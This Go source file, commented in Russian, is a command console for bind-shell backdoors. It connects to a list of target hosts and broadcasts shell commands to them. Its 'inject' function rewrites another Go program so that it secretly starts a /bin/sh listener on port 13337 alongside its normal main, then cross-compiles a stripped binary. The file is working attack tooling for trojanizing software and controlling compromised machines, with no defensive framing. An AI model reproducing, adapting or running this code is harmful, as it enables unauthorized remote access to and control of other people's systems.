package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

// Структура цели
type Target struct {
	name   string
	conn   net.Conn
	status bool
	group  string
}

var global_response_timeout int = 1000
var global_buffer_size int = 4096
var active_targets int = 0

// Предоставляет список встроенных команд (вызов: /BS help).
func BindShellHelp() {
	fmt.Println("[BindShell] Command list:")
	fmt.Println("\n\t\tTargets:")
	fmt.Println("\t- /BS targets \t\t\tShow current targets list;")
	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip>:<port> to set;")
	fmt.Println("\t- /BS remove <host_id> \t\tRemove target from set;")
	fmt.Println("\t- /BS off <host_id> \t\tStop sending commands to the host;")
	fmt.Println("\t- /BS on <host_id> \t\tResume sending commands to the host.")

	fmt.Println("\n\t\tShell injecting:")
	fmt.Println("\t- /BS inject \t\t\tInject bind shell to code and compile it. (BETA)")

	fmt.Println("\n\t\tConfiguration:")
	fmt.Println("\t- /BS config \t\t\tGet current configuration;")
	fmt.Println("\t- /BS timeout <time> \t\tSet targets response timeout to <time> millisecond(s);")
	fmt.Println("\t- /BS buffer <size> \t\tSet buffer size to <size> byte(s).")

	fmt.Println("\n\t\tOther:")
	fmt.Println("\t- /BS help \t\t\tShow this list;")
	fmt.Println("\t- /BS scenario <scenario> \tStart scenario from file <scenario>; (TODO)")
	fmt.Println("\t- /BS stop \t\t\tFinish session.")
}

// Завершает работу программы (вызов: /BS stop)
func BindShellStop(targets *[]Target) {
	// Завершение всех активных соединений
	finishAllSessions(targets)

	// Завершение программы
	fmt.Println("[BindShell] Shutdown...")
	os.Exit(0)
}

// Выводит список целевых хостов (вызов: /BS targets)
func BindShellTargets(targets *[]Target) {
	fmt.Println("[BindShell] Current targets:")
	for i := 0; i < len(*targets); i++ {
		if (*targets)[i].status == true {
			fmt.Printf("\t<%d> [+] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
		} else {
			fmt.Printf("\t<%d> [-] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
		}
	}
}

// Удаляет выбранный хост из списка целей и завершает с ним сессию (вызов: /BS remove)
func BindShellRemove(targets *[]Target, idx int) {
	active_targets--

	// Завершение сессии удаляемого хоста
	finishSession((*targets)[idx])

	fmt.Printf("[BindShell] %s << Host removed from target list.\n", (*targets)[idx].name)

	// Удаление хоста из списка целей
	*targets = append((*targets)[:idx], (*targets)[idx+1:]...)
}

// Приостановление взаимодействия с целью (вызов: /BS off)
func BindShellOff(targets *[]Target, idx int) {
	if (*targets)[idx].status == false {
		fmt.Println("[BindShell] The host is already an inactive target!")
		return
	}

	active_targets--
	(*targets)[idx].status = false
	fmt.Printf("[BindShell] %s off.\n", (*targets)[idx].name)
}

// Возобновление взаимодействия с целью (вызов: /BS on)
func BindShellOn(targets *[]Target, idx int) {
	if (*targets)[idx].status == true {
		fmt.Println("[BindShell] The host is already an active target!")
		return
	}

	active_targets++
	(*targets)[idx].status = true
	fmt.Printf("[BindShell] %s on.\n", (*targets)[idx].name)
}

// Вывод сведений о текущей конфигурации
func BindShellConfig() {
	fmt.Println("[BindShell] Current configuration:")
	fmt.Printf("\tResponse timeout: %d millisecond(s).\n", global_response_timeout)
	fmt.Printf("\tBuffer size: %d byte(s).\n", global_buffer_size)
}

// Устанавливает значение переменной global_response_timeout равным value (вызов: /BS timeout)
func BindShellTimeout(value int) {
	global_response_timeout = value
	fmt.Printf("[BindShell] Response timeout set to %d millisecond(s).\n", global_response_timeout)
}

// Устанавливает значение переменной global_buffer_size равным value (вызов: /BS buffer)
func BindShellBufferSize(value int) {
	global_buffer_size = value
	fmt.Printf("[BindShell] Buffer size set to %d byte(s).\n", global_buffer_size)
}

// Устанавливает соединение с выбранным хостом и добавляет его в список целей (вызов: /BS add)
func BindShellAdd(targets *[]Target, target_name string) {
	addSession(targets, target_name)
}

func addSession(targets *[]Target, target_name string) {
	// Установка соединения с целевым хостом
	conn, err := net.Dial("tcp", target_name)
	if err != nil {
		fmt.Printf("[BindShell] %s << Connection NOT established.\n", target_name)
		return
	} else {
		fmt.Printf("[BindShell] %s << Connection successfully established.\n", target_name)
	}

	// Создание буфера для считывания ОС целевого хоста
	init_buf := make([]byte, global_buffer_size)

	// Чтение ОС хоста
	n, err := conn.Read(init_buf)
	if err != nil {
		fmt.Println("[BindShell] Failed to read host OS!\n")
	}

	// Добавление хоста в список целей
	*targets = append(*targets, Target{name: target_name, conn: conn, status: true, group: string(init_buf[:n])})

	active_targets++
}

func finishSession(target Target) {
	if target.conn.Close() == nil {
		fmt.Printf("[BindShell] %s << Connection successfully terminated.\n", target.name)
	}
}

func finishAllSessions(targets *[]Target) {
	for i := 0; i < len(*targets); i++ {
		finishSession((*targets)[i])
	}
}

func checkTargetNumber(targets *[]Target, input string) (bool, int) {
	idx, err := strconv.Atoi(input)
	if err != nil {
		fmt.Println("[BindShell] The index is an invalid number!")
		return false, 0
	} else if idx >= len(*targets) || idx < 0 {
		fmt.Println("[BindShell] The index is out of bounds!")
		return false, 0
	} else {
		return true, idx
	}
}

func checkPositiveNumber(input string) (bool, int) {
	value, err := strconv.Atoi(input)
	if err != nil {
		fmt.Println("[BindShell] The value is an invalid number!")
		return false, 0
	} else if value < 0 {
		fmt.Println("[BindShell] The value lower then zero!")
		return false, 0
	} else {
		return true, value
	}
}

func BindShellLoadTargets(targets *[]Target, targets_file string) {
	active_targets = 0

	// Завершение всех активных соединений
	finishAllSessions(targets)

	// Очистка списка целей
	*targets = []Target{}

	// Открытие файла с новыми целями
	file, err := os.Open(targets_file)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	// Создание сканера для считывания
	scanner := bufio.NewScanner(file)

	// Построчное считывание файла
	for scanner.Scan() {
		// Получение имени хоста
		target_name := scanner.Text()

		// Добавление сессии
		addSession(targets, target_name)
	}
}

func BindShellInject(file_path string, OS string, Arch string) {
	// Открытие оригинального файла
	original_file, err := os.OpenFile(file_path, os.O_RDWR|os.O_APPEND, 0644)
	if err != nil {
		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", file_path, err.Error())
		return
	}
	defer original_file.Close()

	lines := []string{}
	imports := []string{}
	new_imports := []string{}
	var isImportSection bool

	// Создание сканера для построчного чтения файла
	scanner := bufio.NewScanner(original_file)

	for scanner.Scan() {
		line := scanner.Text()

		// Изменение имени исходной функции main
		if strings.HasPrefix(line, "func main") {
			line = strings.Replace(line, "func main", "func main_payload", 1)
			fmt.Println("main found and replaced.")
		}

		// Проверяем, начинаем ли мы секцию импорта
		if strings.HasPrefix(line, "import (") {
			isImportSection = true
		}

		// Если мы находимся в секции импорта, собираем импорты
		if isImportSection {
			if strings.TrimSpace(line) == ")" {
				isImportSection = false
			} else {
				imports = append(imports, strings.TrimSpace(line))
			}
		}

		lines = append(lines, line)
	}

	/*
		if err := scanner.Err(); err != nil {
			fmt.Println("Scanning error!")
			return
		}
	*/
	fmt.Println(len(lines))

	// Проверка и добавление необходимых импортов
	requiredImports := []string{"\"io\"", "\"net\"", "\"os/exec\""}
	for _, reqImport := range requiredImports {
		if !contains(imports, reqImport) {
			new_imports = append(new_imports, reqImport)
			fmt.Printf("Импорт %s добавлен.\n", reqImport)
		}
	}

	// Обновляем секцию импорта в строках
	if len(new_imports) > 0 {
		lines = updateImports(lines, new_imports)
	}

	err = os.WriteFile("result.go", []byte(strings.Join(lines, "\n")), 0644)

	new_file, err := os.OpenFile("result.go", os.O_RDWR|os.O_APPEND, 0644)
	if err != nil {
		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", new_file.Name(), err.Error())
		return
	}
	defer new_file.Close()

	if err != nil {
		fmt.Println("Writing error!")
		return
	}

	// Строка с инъекцией
	BS_string := "\n\nfunc bs_handle(BS_conn net.Conn) {\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":13337\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}"

	// Добавление инъекции в файл
	if _, err := new_file.WriteString(BS_string); err != nil {
		fmt.Printf("[BindShell] Can't modify file %s with error: %s\n", "result.go", err.Error())
		return
	}

	// Компиляция файла
	// Сохранение прежних значений переменных среды
	old_GOOS := os.Getenv("GOOS")
	old_GOARCH := os.Getenv("GOARCH")

	// Замена переменной окружения GOOS на целевую ОС
	err = os.Setenv("GOOS", OS)
	if err != nil {
		fmt.Println("[BindShell] Can't change GOOS!", err)
		return
	}

	// Замена переменной окружения ARCHOS на целевую архитектуру
	err = os.Setenv("GOARCH", Arch)
	if err != nil {
		fmt.Println("[BindShell] Can't change GOARCH!", err)
		return
	}

	// Компиляция файла
	cmd := exec.Command("go", "build", "-o", "result", "-ldflags", "-w -s", "result.go")
	if err := cmd.Run(); err != nil {
		fmt.Println("[BindShell] Compilation error!", err)
		return
	}

	// Замена переменной окружения GOOS на исходную ОС
	err = os.Setenv("GOOS", old_GOOS)
	if err != nil {
		fmt.Println("[BindShell] Can't change GOOS!", err)
		return
	}

	// Замена переменной окружения ARCHOS на исходную архитектуру
	err = os.Setenv("GOARCH", old_GOARCH)
	if err != nil {
		fmt.Println("[BindShell] Can't change GOARCH!", err)
		return
	}

	fmt.Println("[BindShell] File successfully compiled.")
}

// Проверяет наличие необходимых импортов
func contains(imports []string, imp string) bool {
	for _, i := range imports {
		if i == imp {
			return true
		}
	}
	return false
}

// Обновляет секцию импортов
func updateImports(lines []string, new_imports []string) []string {
	var updatedLines []string
	importSectionStarted := false

	for _, line := range lines {
		if strings.HasPrefix(line, "import (") {
			importSectionStarted = true
			updatedLines = append(updatedLines, line)
			for _, imp := range new_imports {
				updatedLines = append(updatedLines, "\t"+imp)
			}
			continue // Пропускаем добавление закрывающей скобки здесь
		}

		if importSectionStarted && strings.TrimSpace(line) == ")" {
			importSectionStarted = false
		}

		updatedLines = append(updatedLines, line)
	}

	if importSectionStarted { // Если секция импорта была открыта, добавим закрывающую скобку
		updatedLines = append(updatedLines, ")")
	}

	return updatedLines
}

func BindShellRequest(request []string, targets *[]Target) {
	// В случае, если конкретная инструкция не указана, вызывается /BS help
	if len(request) == 1 {
		BindShellHelp()
		return
	}

	switch request[1] {
	case "add":
		if len(request) < 3 {
			return
		}
		BindShellAdd(targets, request[2])
	case "buffer":
		ok, value := checkPositiveNumber(request[2])
		if ok {
			BindShellBufferSize(value)
		}
	case "config":
		BindShellConfig()
	case "help":
		BindShellHelp()
	case "inject":
		BindShellInject(request[2], request[3], request[4])
	case "off":
		// Если аргументов более трех, остановка
		if len(request) > 4 {
			fmt.Println("[BindShell] Error! Correct usage: \"/BS off\" or \"/BS off <host_id>\"\n")
			return
		}

		// Если не указан конкретный хост, приостановить всё
		if len(request) == 2 {
			for i := 0; i < len(*targets); i++ {
				BindShellOff(targets, i)
			}
			return
		}

		// Если указана конкретная группа хостов, присотановить всю группу
		if len(request) == 4 && request[2] == "group" {
			for i := 0; i < len(*targets); i++ {
				if (*targets)[i].group == request[3] {
					BindShellOff(targets, i)
				}
			}
			return
		}

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, приостановить действия на выбранном хосте
		if ok {
			BindShellOff(targets, idx)
		}
	case "on":
		// Если аргументов более трех, остановка
		if len(request) > 4 {
			fmt.Println("[BindShell] Error! Correct usage: \"/BS on\" or \"/BS on <host_id>\"\n")
			return
		}

		// Если не указан конкретный хост, возобновить всё
		if len(request) == 2 {
			for i := 0; i < len(*targets); i++ {
				BindShellOn(targets, i)
			}
			return
		}

		// Если указана конкретная группа хостов, возобновить всю группу
		if len(request) == 4 && request[2] == "group" {
			for i := 0; i < len(*targets); i++ {
				if (*targets)[i].group == request[3] {
					BindShellOn(targets, i)
				}
			}
			return
		}

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, возобновить действия на выбранном хосте
		if ok {
			BindShellOn(targets, idx)
		}
	case "remove":
		// Если аргументов более трех, остановка
		if len(request) > 3 {
			fmt.Println("[BindShell] Error! Correct usage: \"/BS remove\" or \"/BS remove <host_id>\"\n")
			return
		}

		// Если не указан конкретный хост, удалить всё
		if len(request) == 2 {
			cnt := len(*targets)
			for i := 0; i < cnt; i++ {
				BindShellRemove(targets, 0)
			}
			return
		}

		/*
			// Если указана конкретная группа хостов, удалить всю группу
			if len(request) == 4 && request[2] == "group" {
				cnt := len(*targets)
				for i := 0; i < cnt; {
					if (*targets)[i].group == request[3] {
						BindShellOff(targets, i)
					} else {
						i++
					}
				}
				return
			}
		*/

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, удаляет выбранный хост
		if ok {
			BindShellRemove(targets, idx)
		}
	case "stop":
		BindShellStop(targets)
	case "targets":
		BindShellTargets(targets)
	case "timeout":
		ok, value := checkPositiveNumber(request[2])
		if ok {
			BindShellTimeout(value)
		}
	}
}

func sendCommand(target Target, input string, ch_resp chan string) {
	// Отправка команды на целевой хост
	_, err := target.conn.Write([]byte(input + "\n"))
	if err != nil {
		log.Fatalln(err)
	}

	// Установка дедлайна для чтения ответа
	if err := target.conn.SetReadDeadline(time.Now().Add(time.Duration(global_response_timeout) * time.Millisecond)); err != nil {
		ch_resp <- fmt.Sprintf("Error setting read deadline for %s: %v", target.name, err)
		log.Fatalln(err)
	}

	// Чтение ответа
	buffer := make([]byte, global_buffer_size)
	n, err := target.conn.Read(buffer)
	if err != nil {
		ch_resp <- ""
		return
	}

	// Отправка ответа в канал
	ch_resp <- fmt.Sprintf("Response from %s:\n%s", target.name, string(buffer[:n]))
}

func main() {
	// Инициализация контейнера целей
	targets := make([]Target, 0, 1)

	// Считывание целей из файла
	BindShellLoadTargets(&targets, os.Args[1])

	// Создание объекта NewReader стандартного потока ввода
	reader := bufio.NewReader(os.Stdin)

	// Инструктаж пользователя
	fmt.Printf("[BindShell] Print \"/BS help\" to get info.\n")
	for {
		// Приглашение к вводу команды
		fmt.Print("[BindShell] >> ")

		// Считывание команды пользователя
		input, _ := reader.ReadString('\n')

		// Обработка пустого ввода
		if len(input) <= 2 {
			continue
		}

		// Удаление лишних символов
		input = strings.TrimSpace(input)

		// Разбиение команды на аргументы
		splitted_input := strings.Fields(input)

		// Проверка типа команды
		if splitted_input[0] == "/BS" {
			// Выполнение встроенной команды BindShell
			BindShellRequest(splitted_input, &targets)
		} else {
			// Создание канала для получения результатов команд
			ch_resp := make(chan string)

			// Выполнение команды для каждого активного хоста
			for i := 0; i < len(targets); i++ {
				if targets[i].status == true {
					// Отправка команды на целевой хост
					go sendCommand(targets[i], input, ch_resp)
				}
			}

			// Получение ответов от каждого активного хоста
			for i := 0; i < active_targets; i++ {
				response := <-ch_resp
				if len(response) > 0 {
					fmt.Println(response)
				}
			}
		}
	}
}
